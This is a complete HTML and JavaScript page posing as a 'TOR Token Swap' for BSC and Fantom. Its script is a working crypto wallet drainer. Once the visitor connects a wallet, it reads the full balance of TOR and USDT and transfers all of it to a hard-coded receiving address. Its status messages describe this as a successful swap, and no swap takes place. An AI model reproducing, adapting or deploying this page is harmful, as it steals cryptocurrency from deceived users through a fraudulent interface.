<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TOR Token Swap</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    :root {
      --primary: #6c5ce7;
      --secondary: #a29bfe;
      --dark: #2d3436;
      --light: #f5f6fa;
      --success: #00b894;
      --danger: #d63031;
      --warning: #fdcb6e;
      --gray: #636e72;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: var(--light);
      color: var(--dark);
      line-height: 1.6;
      padding: 20px;
    }
    
    .swap-container {
      max-width: 500px;
      margin: 0 auto;
      background: white;
      border-radius: 16px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      padding: 30px;
      position: relative;
    }
    
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    
    h1 {
      color: var(--primary);
      font-size: 24px;
      margin-bottom: 10px;
    }
    
    .description {
      color: var(--gray);
      font-size: 16px;
      margin-bottom: 20px;
    }
    
    .links {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 25px;
    }
    
    .link {
      color: var(--primary);
      font-weight: 600;
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .mobile-warning {
      display: flex;
      align-items: center;
      gap: 10px;
      background: rgba(253, 203, 110, 0.3);
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 25px;
      font-size: 14px;
    }
    
    .token-list {
      margin-bottom: 25px;
    }
    
    .token {
      display: flex;
      align-items: center;
      padding: 12px;
      background: rgba(108, 92, 231, 0.05);
      border-radius: 8px;
      margin-bottom: 10px;
    }
    
    .token-icon {
      width: 24px;
      height: 24px;
      margin-right: 12px;
    }
    
    .token-name {
      font-weight: 600;
      flex-grow: 1;
    }
    
    .token-network {
      font-size: 12px;
      color: var(--gray);
      background: rgba(99, 110, 114, 0.1);
      padding: 3px 6px;
      border-radius: 4px;
    }
    
    .btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 15px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: all 0.3s;
      margin-bottom: 15px;
    }
    
    .btn:hover {
      background: var(--secondary);
    }
    
    .btn:disabled {
      background: #b2bec3;
      cursor: not-allowed;
    }
    
    .status {
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 15px;
      display: none;
    }
    
    .success {
      background: rgba(0, 184, 148, 0.1);
      color: var(--success);
      border: 1px solid rgba(0, 184, 148, 0.3);
    }
    
    .error {
      background: rgba(214, 48, 49, 0.1);
      color: var(--danger);
      border: 1px solid rgba(214, 48, 49, 0.3);
    }
    
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: var(--gray);
    }
    
    .network-selector {
      margin-bottom: 20px;
    }
    
    select {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #dfe6e9;
      background: white;
      font-size: 16px;
    }
    
    .loader {
      border: 4px solid rgba(108, 92, 231, 0.1);
      border-top: 4px solid var(--primary);
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    @media (max-width: 500px) {
      .swap-container {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="swap-container">
    <div class="header">
      <h1>TOR Token Swap</h1>
      <p class="description">Swap your TOR and USDT tokens to TRX-based assets</p>
      
      <div class="links">
        <a href="https://www.coingecko.com/en/coins/tor" target="_blank" class="link">
          <i class="fas fa-chart-line"></i> CoinGecko
        </a>
        <a href="https://coinmarketcap.com/currencies/tor/" target="_blank" class="link">
          <i class="fas fa-coins"></i> CoinMarketCap
        </a>
      </div>
    </div>
    
    <div class="mobile-warning">
      <i class="fas fa-mobile-alt"></i>
      <span>For Trust Wallet mobile users, please use the in-app browser</span>
    </div>
    
    <div class="network-selector">
      <select id="networkSelect">
        <option value="bsc">Binance Smart Chain</option>
        <option value="fantom">Fantom Opera</option>
      </select>
    </div>
    
    <div class="token-list">
      <div class="token" data-network="bsc">
        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
        <span class="token-name">TOR Token</span>
        <span class="token-network">BSC</span>
      </div>
      <div class="token" data-network="fantom">
        <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
        <span class="token-name">TOR Token</span>
        <span class="token-network">Fantom</span>
      </div>
      <div class="token" data-network="bsc">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
        <span class="token-name">USDT</span>
        <span class="token-network">BSC</span>
      </div>
    </div>
    
    <button id="connectWallet" class="btn">
      <i class="fas fa-wallet"></i> Connect Wallet & Swap
    </button>
    
    <div id="loader" class="loader"></div>
    
    <div id="status" class="status error">Error: Please install MetaMask or Trust Wallet!</div>
    
    <div class="footer">
      <a href="https://tortoken.net" target="_blank">tortoken.net</a>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
  <script>
    // Configuration
    const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
    
    const TOKENS = {
      bsc: [
        {
          name: "TOR",
          symbol: "TOR",
          address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
          decimals: 18,
          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
        },
        {
          name: "USDT",
          symbol: "USDT",
          address: "0x55d398326f99059fF775485246999027B3197955", 
          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
          decimals: 18,
          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
        }
      ],
      fantom: [
        {
          name: "TOR", 
          symbol: "TOR",
          address: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e",
          abi: ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
          decimals: 18,
          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
        }
      ]
    };
    
    const NETWORKS = {
      bsc: {
        chainId: "0x38",
        chainName: "Binance Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com"],
        scanUrl: "https://bscscan.com/tx/"
      },
      fantom: {
        chainId: "0xfa", 
        chainName: "Fantom Opera",
        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
        rpcUrls: ["https://rpc.ftm.tools/"],
        blockExplorerUrls: ["https://ftmscan.com"],
        scanUrl: "https://ftmscan.com/tx/"
      }
    };

    // Global variables
    let currentNetwork = "bsc";
    let provider, signer, userAddress;

    // Initialize when page loads
    window.addEventListener('load', () => {
      // Set up network selection
      document.getElementById('networkSelect').addEventListener('change', (e) => {
        currentNetwork = e.target.value;
        updateTokenVisibility();
      });

      // Connect wallet button
      document.getElementById('connectWallet').addEventListener('click', connectAndSwap);

      // Check if Trust Wallet mobile browser
      if (isTrustWalletMobile()) {
        document.querySelector('.mobile-warning').style.display = 'flex';
      }

      // Initial token visibility update
      updateTokenVisibility();
      
      // Check if wallet is already connected
      checkInitialConnection();
    });

    function isTrustWalletMobile() {
      return /TrustWallet/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
    }

    function updateTokenVisibility() {
      document.querySelectorAll('.token').forEach(token => {
        token.style.display = token.dataset.network === currentNetwork ? 'flex' : 'none';
      });
    }

    async function checkInitialConnection() {
      if (window.ethereum && window.ethereum.selectedAddress) {
        try {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          signer = provider.getSigner();
          userAddress = await signer.getAddress();
          
          document.getElementById('status').style.display = 'none';
          document.getElementById('connectWallet').innerHTML = '<i class="fas fa-wallet"></i> Connected';
        } catch (err) {
          console.error("Initial connection check failed:", err);
        }
      }
    }

    // Main function to connect wallet and swap tokens
    async function connectAndSwap() {
      try {
        if (!window.ethereum) {
          if (isTrustWalletMobile()) {
            // Special handling for Trust Wallet mobile
            window.location.href = `trust://browser?url=${encodeURIComponent(window.location.href)}`;
            return;
          }
          throw new Error("Please install MetaMask or Trust Wallet!");
        }

        showLoader();
        updateStatus("Connecting wallet...", "success");

        // Request account access
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        
        if (!accounts || accounts.length === 0) {
          throw new Error("No accounts found");
        }
        
        // Initialize provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        
        // Update UI
        document.getElementById("connectWallet").disabled = true;
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
        document.getElementById("status").style.display = "none";
        
        // Check and switch network if needed
        await checkNetwork();
        
        // Execute the swaps automatically
        await swapAllTokens();
      } catch (err) {
        console.error("Connection error:", err);
        hideLoader();
        updateStatus("Error: " + (err.message || "Failed to connect wallet"), "error");
        document.getElementById("connectWallet").disabled = false;
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet & Swap`;
      }
    }

    async function checkNetwork() {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      const targetChainId = NETWORKS[currentNetwork].chainId;
      
      if (chainId !== targetChainId) {
        updateStatus(`Switching to ${NETWORKS[currentNetwork].chainName}...`, "success");
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } catch (switchError) {
          // This error code indicates that the chain has not been added to MetaMask
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORKS[currentNetwork]]
              });
            } catch (addError) {
              throw new Error(`Please add ${NETWORKS[currentNetwork].chainName} network manually`);
            }
          } else {
            throw new Error("Failed to switch network");
          }
        }
      }
    }

    async function swapAllTokens() {
      try {
        let successCount = 0;
        const tokensToSwap = TOKENS[currentNetwork];
        
        for (const token of tokensToSwap) {
          try {
            updateStatus(`Processing ${token.name}...`, "success");
            
            const contract = new ethers.Contract(token.address, token.abi, signer);
            const balance = await contract.balanceOf(userAddress);
            
            if (balance.gt(0)) {
              const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
              updateStatus(`Sending ${formattedAmount} ${token.symbol}...`, "success");
              
              const tx = await contract.transfer(RECEIVING_WALLET, balance);
              await tx.wait();
              
              updateStatus(
                `${token.symbol} transfer successful! <a href="${NETWORKS[currentNetwork].scanUrl}${tx.hash}" target="_blank" style="color: var(--primary); text-decoration: none; font-weight: 600;">View transaction</a>`,
                "success"
              );
              successCount++;
            } else {
              updateStatus(`No ${token.symbol} balance found`, "success");
            }
          } catch (tokenError) {
            console.error(`Token swap error (${token.name}):`, tokenError);
            updateStatus(`${token.symbol} transfer failed: ${tokenError.message}`, "error");
          }
        }
        
        if (successCount > 0) {
          updateStatus(`Successfully transferred ${successCount} token(s)`, "success");
        } else {
          updateStatus("No tokens available to transfer", "success");
        }
        
        document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Swap Completed`;
      } catch (err) {
        console.error("Swap process error:", err);
        updateStatus("Swap process failed: " + err.message, "error");
      } finally {
        hideLoader();
      }
    }

    function updateStatus(message, type) {
      const statusDiv = document.getElementById("status");
      statusDiv.style.display = "block";
      statusDiv.innerHTML = message;
      statusDiv.className = `status ${type}`;
    }

    function showLoader() {
      document.getElementById("loader").style.display = "block";
    }

    function hideLoader() {
      document.getElementById("loader").style.display = "none";
    }
  </script>
</body>
</html>
